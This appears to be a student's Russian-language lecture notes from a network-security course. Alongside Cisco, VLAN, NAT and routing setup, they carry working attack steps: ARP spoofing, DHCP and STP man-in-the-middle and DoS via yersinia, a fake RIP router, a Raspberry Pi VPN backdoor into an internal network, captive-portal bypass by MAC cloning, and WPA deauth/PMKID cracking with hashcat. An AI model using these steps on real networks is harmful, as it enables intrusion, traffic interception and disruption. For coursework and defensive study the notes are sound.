@@ -1,0 +1,748 @@
+Занятие 1
+По кабелям данные передаются при помощи повышения/понижения напряжения
+Коллизия - наложение сигналов 
+
+IANA - организация, занимающаяся продажей и контролем распределения IP и MAC адресов
+На данный момент IPv4 адреса можно только перекупить. Пул  уже закончился
+
+MAC - первые 6 символов - данные о производителе (macvendors.com)
+Мак записан в прошивке девайса
+
+CAM table - таблица, где расписано соответствие интерфейса и мак адреса подключенного к нему клиента
+
+Если закинуть на свитч мног айпи адресов, то таблица CAM переполнится и свитч будет работать как хаб
+
+ARP таблица хранит данные 120 секунд
+
+
+ARP spoofing
+убеждаем хосты в том, что mac их собеседника изменился на мак злоумышленника
+
+IDS - сервер для анализа всего сетевого трафика 
+
+NGFW - New Generation FireWall
+
+HoneyPot - подставной хост, который ни с ке мне общается. Однако при массовом сканировании он создает лог
+Далее у него обычно открыт ssh порт. Пускает только на 3-5 раз, что бы выудить у злоумышленника известные креды
+
+
+
+Занятие 2
+? - список всех доступных команд на устройствах cisco
+MTU - базовый размер фрейма = 1500 байт
+
+Из 4 свитчей Cisco можно собрать суперсвитч, который будет управляться как одно устройство. Зачем? Нужно больше портов!
+
+Для того, что бы просмотреть трафик по https нужно устроить mitm на всю организацию. Для этого поднимают прокси сервер
+Если нажать на замок в строке браузера, нажать на сертефикат, и в поле "кому выдан" указан рабочий домен, значит
+в компании стоит прокси сервер и весь трафик просматривается, даже зашифрованный.
+
+mdm exchange позволяет дистанционно сбросить подключенный телефон до заводских настроек! 
+
+MAC адреса могут быть в разных видах: (Linux AA:BB:CC:DD:EE:FF) (Windows AA-BB-CC-DD-EE-FF) (Cisco AABB.CCDD.EEFF)
+
+Ctrl + Shift + 6 - если случайно запустили некоректную команду и пошел резолв
+
+
+Вся операционка Cisco IOS хранится в отдельной плашке оперативки. Туда ось попадает с внутренней памяти при перезагрузке
+
+write - команда для сохранения текущего конфига в стартовый 
+
+enable
+conf t
+interface vlan1
+ip addr <address>
+no shutdown
+
+username user password Qq123456		//добавить юзера
+do show running-config - do нужно указывать если мы пытаемсявызвать из режима конфигурации	
+aaa new-model 				//разрешаем юзеру удаленный доступ 
+do write
+
+user privelege 0-15
+
+Если видим в строке хеша пароля пользователя заглавные буквы и цифры - пароль легко взломать
+
+Wireshark
+пкм + Follow tcp stream - просмотреть захваченный трафик полностью 
+
+
+у arpspoof есть флаг, что бы снифить подсеть читай man arpspoof
+или можно сделать в hersini?
+
+ssl stripe - для подмены сертификатов и вайршаркинга трафика
+задача - загнать свой сертификат в доверенные жертве
+
+
+
+Занятие 3
+Broadcast storm - из-за петли широковещательного запроса свитч перестает стабильно работать
+
+Spaning Tree Protocol - проткол включается если в сети есть петли и обрубает порты
+Root Identifier чем меньше идентификатор - тем круче девайс
+
+STP - по логике не самый быстрый протокол, поэтому его почти не используют в больших сетях
+
+Законектить два свитча вторым проводом, подключиться и изменить свой идентификатор на 0 - митм готов!
+
+При физическом пентесе зачастую в здании есть ethernet разетки и они часто криво настроенны. 
+Из разетки в кафе можно законектиться к главному серваку
+
+show spanning-tree	//на циске показать данные об STP
+
+при  расчете адресов нужно исходить  из количества хостов + 2 ( один нулевой, другой на броадкаст)
+
+при разведке нужно составить карту сети
+Если карта сети  попадает не  в те руки - это очень плохо
+
+
+
+Занятие 4
+172.16.12.60/27
+32-27 = 5  =  2^5=32
+172.16.12.0  - 172.16.12.31
+172.16.12.32 - 172.16.12.63
+
+TTL  из
+
+MITM через  фейковй DHCP-сервер
+apt install yersinia
+
+
+настройка dhcp на роутере
+enable
+ip dhcp pool <name>
+network 10.0.0.0 255.255.255.0
+default-router 10.0.0.254
+dns-server 8.8.8.8 8.8.4.4.
+domain-name hackeru.local
+do show run
+exit
+ip dhcp excluded-address 10.0.0.0 10.0.0.100
+do show arp
+do ip dhcp binding 
+do write
+
+yersinia	хороша программа для митма по dhcp 
+yerinia -I
+g -> dhcp server
+x 0
+x 1	//dos start sending
+x 2	//create point
+x 3 	//deauth all
+
+
+
+Занятие 5 
+root-servers.org - сайт, на котором хранится информация обо всех 13 корневых dns серверах
+DNS poisoning - атака через нзащищенный протокол DNS без DNSsec
+
+router:
+ip domain-name hackeru.local
+ip name-server 8.8.8.8 8.8.4.4
+ip domain-lookup
+ip dns server
+ip host pc7.hackeru.local 10.0.0.103
+
+ip dhcp pool dhcppoolname1
+dns-server 10.0.0.254
+
+NAT
+таблица трансляций - зранится на роутере и нужна для того, что бы роутер знал, откуда шел запрос и куда слать ответ
+192.168.1.34 | 8.8.8.8 | 163.45.3.24 | 8.8.8.8
+серый мой    |         |белый серверa|
+
+приконектиться к сети извне очень трудно. Но сеть может устанавливать соединения изнутри во вне =)
+
+нашли порт? 
+первая атака - брут
+
+почтитать историю CVE - может пригодится)
+
+
+
+Занятие 6
+статическая трансляця
+show dhcp lease 
+(config) ip nat inside source static 10.0.0.101 int e0/1
+(config) do sh ip nat tr
+(config) int e0/0
+(config-if) ip nat inside
+(config) int e0/1
+(config-if) ip nat outide
+
+портовая адресация
+(config) access-lit 100 permit ip 10.0.0.0 0.0.0.255 any
+(config) ip nat inside source list 100 interface e0/1 overload
+
+
+В фрейме есть элемент, отвечающий за принадлежность к подсети
+
+20:33 - очень неплохой прмер по разбивке сетей
+
+access - соединение свитч-клиент
+trunk  - соединение свитч-свитч
+
+VLAN ID - число, отвечающее за распределение сетей
+
+conf t
+vlan 150
+name Progr
+
+протокол 802.1Q - протокол, записывающий тег в фрейм. нкапсулирует VLAN в фрейм
+
+DTP - dynamic trunking protocol - автоматически разбирается с Trunk  и Access
+
+conf t
+interface e1/0
+switchport mode access
+switchport access vlan 150
+
+
+Заняте 7
+Private VLAN (PVLAN) - хосты не могут взаимодействовать друг с другом, хоть  находятся в одной виртуальной сети
+используется редко, но иногда спользуется в качестве костыля для изоляци виртуалок на сервере
+
+Вместо ручного прописывания VLANов можно сделать это через табличку VLAN.dat
+
+
+vtp ?
+
+Делаем свитч-сервер
+enable
+conf t
+vtp domain hackeru.local
+vtp version 3
+vtp password Qq123456 hidden
+vtp mode server
+exit
+vtp primary
+
+
+
+sh run | begin <начало>
+sh run | include <встреччается> 
+
+Делаем свитчи-клиенты
+en
+conf t
+vtp domain hackeru.local
+vtp password Qq123456
+vtp version 3
+vtp mode client
+
+Можно настраивать сразу несколько интерфейсов
+int range e0/1-2
+
+
+#перевести в trunk#
+switchport trunk encapsulation dot1q
+switchport mode trunk 
+
+show vlan brief - показать все vlan-ы
+show run interface <e0/0> - показать стоит ли интерейс в транке
+
+
+#перевести в access#
+conf t
+interface e1/0
+switchport mode access
+switchport access vlan 150
+
+
+добавить вланы
+на роутере
+int e0/0.16
+encapsulation dot1Q 16
+ip address 10.0.0.14 255.255.255.240
+(если ошибка - int e0/0 + no ip address)
+network 10.0.1.0 255.255.255.0
+default-router 10.0.1.254
+dns-server 8.8.8.8
+domain-name hackeru.local
+
+
+
+Занятие 8
+Port security
+бегунок - сотруднк, который втыкает свой ноут в чуже разетки
+Защита - сделать привязку по мак-адресу
+en
+conf t
+int e0/3
+switchport port-security mac-address sticky	//автомат настройка разрешенных mac на портах. Кто первый - того и мак
+switchport port-security			//активация режима
+
+do show int e0/3 status
+если connected - все хорошо
+err diasbled - к порту подключили не тот ноут!
+что бы восстановить все в рабочее состояние:
+conf t
+int e0/3
+shutdown
+no shutdown
+
+switchport port-security maximum <2> 		//разрешаем на порту несколько маков
+
+do show mac address				//показать авторизованные маки
+
+
+ACL (Access Control List)
+по умолчанию режет весь трафик
+правило, примененное на физический интерфейс не подействует на виртуальные интерфейсы
+Inbound ACL - роутер чекает входящий трафик
+Outbound ACL - роутер чекает исходящий трафик
+
+en
+conf t
+access-list 1 permit host 10.0.1.1	//1 - название правила
+int e0/0.150
+
+числовые acl - одна строка
+
+en
+conf t
+ip access-list extended tech-block
+permit ip 10.0.0.128 0.0.0.127 host 10.0.2.1 log
+9 permit ip 10.0.0.128 0.0.0.127 10.0.0.128 0.0.0.127
+deny ip any any
+exit 
+exit
+show access-lists
+conf t
+int e0/0.8
+ip access-group tech-block in
+
+
+
+Занятие 9
+Kali Nessus:
+www.tenable.com/downloads/nessus
+качаем версию для debian внизу 
+dpkg -i <скачанный деб пакет>
+/bin/systemctl start nessusd.service
+firefox https://kali-Security:8834/ 
+nessus essentials
+регаем аккаунт с 10-минутной почты
+
+/usr/share/nmap - папка со скриптами для нмапа
+nmap -sV - версия софта
+
+Найти адрес сайта. 
+На 2ip.ru информация об айпи адресе позволяет найти адрес с маской
+По маске можно узнать диапазон возможных адресов и просканировать их
+
+F12 + вкладка security - показать используемый сертификат
+
+attack.mitre.org
+
+
+
+Занятие 10
+en
+conf t
+int e0/0
+ip addr 11.1.0.10 255.255.255.0
+no shutdon
+int e0/0
+ip addr 11.0.0.10 255.255.255.0
+no shutdown
+hostname C-R-10
+ip route 11.1.1.0 255.255.255.0 e0/1
+
+Автономная система - набор роутеров, объединенных в сеть
+
+коннект в  eve  по ssh
+nano /etc/network/interfaces 
+<дописать>
+auto ens7
+iface ens7 inet dhcp
+<>
+ifup ens7
+
+11111111.11111111.11111111.1111111
+00001
+
+
+
+Занятие 11
+в госкомпании нужно заранее выбивать бюждет
+
+Если решить все эти лабы - можно спокойно устроиться админом
+https://hackmd.io/@sadykovildar/B16xYzRmw
+
+на L3 передаются ip-пакеты
+
+RIP - протокол динамической маршрутизации, который делится знаниями с соседом
+Таблица Маршрутизации -
+максимальное количество роутеров при использовании RIP - 15
+при удалении роутер занимает 16 место в таблице маршрутизации
+
+OSPF - еще один динамический протокол. Ищет наиболее легкий по весу маршрут
+вес - обратно пропорционален скорости маршрута
+
+AREA - сегментирование сети на зоны, что бы  уменьшить влияние дубликатов сетей при обмене таблицами маршрутизации
+
+
+Настройка динамического протокола RIP
+Cisco
+после конфигурации интерфейсов
+conf t
+router rip
+no auto-summary
+version 2
+network 10.0.8.0
+network 10.0.7.0
+network 10.0.2.0
+do sh run | section rip - rip обобщит сеть в 10.0.0.0
+
+Mikrotik
+routing rip
+print
+network
+add network=10.0.7.0/24
+
+
+Добавляем фейковый роутер
+настраиваем интерфейс
+router rip 
+version 2
+network 10.0.0.0
+int loopback 0
+ip address 8.8.8.8 255.255.255.255
+
+
+Настройка OSPF
+conf t
+router ospf 1
+network 11.0.5.0 0.0.0.255 area 0
+
+
+no ip domain lookup - что бы не было пингов по русским символам в циске
+
+Задача сломать ospf и rip
+Задача - положить сеть подключив к роутеру странные устройства
+
+
+
+Занятие 12
+trunk - связка  маленьких  трубок  (тегируемый трафик) трафик тегируется по  интерфейсам
+access - одна маленькая  трубка из связки (не тегируемый  трафик) трафик в перемешку
+
+/etc/hostname  - конфиг, где можно поменять имя машины
+
+В /etc/sysctl.conf раскоментить net.ipv4.ip_forward=1
+sysctl -p  	//применить обновленные настройки ядра
+
+Делаем NAT на линуксе
+iptables -t nat -A  POSTROUTING -o ens3 -j MASQUERADE  //включаем натинг всего  исходящего трафика
+iptables -A FORWARD -s 10.0.20.0/24  -d 10.0.10.0/24 -j DROP
+iptables -I FORWARD 1 -s 10.0.20.0/24  -d  10.0.10.0/24  -m state --state  ESTABLISHED,RELATED -j ACCEPT
+
+iptables -L -v --line-numbers	//показать правила файервола
+
+L4 - Firewall
+
+
+
+Занятие 13
+L4  -  порты  (22,  80,  443...)
+
+vpn - еще раз оборачивает пакет в ip адрес и 
+
+vpn - засунули документы в трубу и отправили другу
+proxy - кричим другу, что бы он крикнул дальше
+
+
+
+НАСТРАИВАЕМ BACKDOOR ЧЕРЕЗ RASPBERRY PI
+
+Сначала настроим L3
+
+Если поднять VPN сервер и подключить к нему Rassbpery Pi, то если воткнуть его внутри инфраструктуры - можно получить прямой доступ к сети
+
+Крутой скрипт для автоматической развертки VPN-сервера на удаленной машине
+github.com/angristan/openvpn-install
+под Usage скрипт. Скопировать и вставить в терминал
+
+копируем с Kali client.ovpn в client.conf на Raspberry
+коментируем "explicit-exit" "ignore-unknown" "setenv opt"
+копируем в /etc/openvpn
+Запускаем через cd /etc/openvpn && openvpn --config client.conf
+
+Что бы не слать весь трафик через впн, нужно на Кали в /etc/openvpn/server.conf закоментить оба push
+
+
+<не успел>
+
+на Raspberry включаем NAT
+iptables -t nat -A  POSTROUTING -o ens3 -j MASQUERADE
+В /etc/sysctl.conf раскоментить net.ipv4.ip_forward=1
+sysctl -p
+
+на Кали /etc/openvpn/ccd
+iroute 192.168.1.0 255.255.255.0 - прописываем сеть, в которую воткнут raspberry
+service openvpn restart
+
+1) Включить Роутинг
+2) Включить NAT
+3) Настроить 
+
+
+Теперь переходим к L2
+
+На Кали 
+nano /etc/openvpn/erver.conf
+меняем dev tun на dev tap и proto udp на proto tcp
+service openvpn restart
+
+На Rasspberry 
+nano client.conf
+меняем dev tun на dev tap и proto udp на proto tcp
+и ставим apt install bridge-utils
+
+На Raspberry
+
+
+На Raspberry
+nano /etc/network/interfaces дописать
+#Tap0
+auto tap0
+iface tap0 inet manual
+
+#Bridge
+auro br0
+iface br0 inet dhcp
+	bridge_ports ens3 tap0
+
+service networking restart
+
+
+Arp-Spoof
+netdiscover <тоже пересмотреть>
+
+
+
+alt + f1, f2, f3 - переключение между вкладками терминала
+
+
+
+replay
+1) на RPi nano /etc/network/interfaces:
+# The primary network interface
+auto ens3
+iface ens3 inet dhcp
+
+service networking restart
+
+apt update && apt upgrade
+
+
+2) на Kali
+curl -O https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh
+chmod +x openvpn-install.sh
+./openvpn-install.sh
+-ip
+-public ip (в случае лабы - они совпадают)
+-n
+-1
+-1
+-1
+-n
+-n
+-подтверждаем и ждем
+-вводим client name (client)
+-1
+в папке появится client.ovpn
+
+настроим ssh соединение, что бы передать client.ovpn на RPi
+nano /etc/ssh/sshd_config
+раскоментить PermitRootLogin и поменять prohibit-password на yes
+service ssh restart
+
+
+3) На RPi
+scp root@<kali ip>:/<путь к файлу>/client.ovpn ./client.conf
+nano client.conf
+#explicit-exit-notify
+#ignore-unknown-option block-outside-dns
+#setenv opt block-outside-dns # Prevent Windows 10 DNS leak
+
+apt install openvpn -y
+cp client.conf /etc/openvpn/
+cd /etc/openvpn
+openvpn --config client.conf 
+останавливаем
+
+
+4) на Kali
+nano /etc/openvpn/server.conf
+#push "dhcp-option DNS 192.168.6.2"
+#push "redirect-gateway def1 bypass-dhcp"
+service openvpn restart
+
+
+5) на RPi
+openvpn --config client.conf
+alt + f2
+ip a 
+создался туннель tun0 с некоторым адресом
+теперь можно подключаться по ssh к RPi через VPN (адрес узнаем ччерез ip a)
+
+
+6) на Kali
+добавляем маршрут к внутренней сети
+ip route add 192.168.1.0/24 via <адрес tun0>
+
+
+7) на RPi
+включаем NAT
+iptables -t nat -A  POSTROUTING -o ens3 -j MASQUERADE
+nano /etc/sysctl.conf
+раскоментить net.ipv4.ip_forward=1
+sysctl -p
+
+
+8) на Kali
+cd /etc/openvpn/ccd/
+nano client
+в созданный файл прописать iroute 192.168.1.0 255.255.255.0
+service openvpn restart
+ip route add 192.168.1.0/24 via 10.8.0.2
+
+
+9) на RPi
+alt + f1 
+перезапускаем сервер
+
+
+включаем L2
+10) на Kali 
+nano /etc/openvpn/server.conf
+#dev tun
+дописать dev tap
+#proto udp
+дописать proto tcp
+
+
+11) на RPi
+останавливаем 
+nano client.conf
+#proto udp
+proto tcp
+#dev tun
+dev tap
+запускаем
+alt+f2
+apt install bridge-utils
+nano /etc/network/interfaces
+iface ens3 inet manual вместо dhcp
+
+#Tap0
+auto tap0
+iface tap0 inet manual
+
+#Bridge
+auto br0
+iface br0 inet dhcp
+	bridge_ports ens3 tap0
+
+service networking restart
+service networking restart второй раз
+
+
+
+### Бонус Атака Arp Spoof ###
+netdiscover -i tap0 	сканируем сеть и ищем айпишник жертвы
+nmap 192.168.1.102 -O	узнаем ось
+arp -a			выводим список адресов
+arpspoof -i tap0 -t <ip роутера> -r <ip жертвы>
+wireshark
+фильтр ip.addr == 192.168.1.105
+
+
+
+
+Занятие 14 Wi-Fi
+Hack5 - можно  заказать нормальне девайсы
+Важно, при заказе попросить указать в описании, что это wifi роутер. Что бы не было проблем с таможней
+
+WiFi работает по разнм стандартам. Важно понимать, какие стандарт поддерживает оборудование
+
+Вардрайвинг - 
+
+При подключении и клиент и точка доступа должн поддерживать одинакове стандарты
+1) Точка транслирует данные о своем существовании 
+2) Клиент кидает запрос на подключение
+--открытая точка--
+3) Точка авторизует его запрос
+--скртая точка--
+3) Клиент в запросе должен сам отправить SSID, что бы подключится 
+4) Точка авторизует его запрос
+--WPA2 точка--
+3) Точка просит еще раз отправить запрос, но зашифровать его при помощи ключа (пароль от WiFi)
+4) Клиент отправляет зашифрованнй запрос (это и есть хендшейк)
+5) Точка отправляет WPA-key, зашифрованнй при помощи того-же "пароля от WiFi"
+6) Далее общение происходит при помощи этого ключа. Он время от времени меняется. Ключ нужен для симетричного шифрования 
+
+
+
+SSID скрытой точки можно узнав, если перехватить подключение авторизованного пользователя. В его запросе на подключение будет ssid 
+
+Capactive Portal - авторизация по номеру телефона на wifi
+
+Лайфхак как обойти это:
+Через мониторинг ищем мак адреса клиентов
+Есть скрипт, который позволяет искать макадреса клиентов, которе платят за безрекламнй вайфай
+
+Если взять чужой макадрес и поставить себе, то сеть может работать не очень стабильно, ибо на уровне L2 будет два одинаковх мака
+Но если человека больше нет в сети, то можо спокойно брать его адрес
+
+USB адаптеры
+запрос - оборудование для вардрайвинга 2020 (kurets.ru)
+чипсет RTL8812AU - не рекомендуется (работает плохо)
+
+
+Взлом через Aircrack-ng
+Проверка карточки
+iwonfig
+
+airmon-ng start wlan0
+Если поставить регион Боливию, то мощность wifi устройства будет неограниченной
+iw reg set BO - примерно так это можно сделать
+
+airodump-ng wlan0mon --channel 1 --bssid <MAC роутера> -w <куда сохранить>
+aireplay-ng -0 1 -a <MAC клиента> -c <MAC роутера> wlan0mon
+
+На винде с hashcat
+
+codeby.net wpa hahcat - сайт со статьей
+Радужная таблица - вместо брута мы используем заранее готовые связки хэш-пароль. Минус - таблица весит несоклько терабайт
+
+
+Wifi pkmid
+https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-passwords-using-new-pmkid-hashcat-attack-0189379/
+ДЗ дамп из телеги - сделать атаку по гайду
+
+Установка
+git clone https://github.com/ZerBea/hcxtools.git
+cd hcxtools
+apt-get install pkg-config libcurl4-openssl-dev libssl-dev zlib1g-dev
+make
+make install (as super user)
+cd ..
+git clone https://github.com/ZerBea/hcxdumptool.git
+cd hcxdumptool
+make
+make install
+apt install hashcat
+
+Атака
+airmon-ng start wlan0
+hcxdumptool -i wlan0mon -c <channel> -o <output file>.pcapng --enable_status=1
+hcxpcaptool -E essidlist -I identitylist -U usernamelist -o galleriaHC.16800 galleria.pcapng
+hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'
+
+WPA Krack
+
+Заняте 15
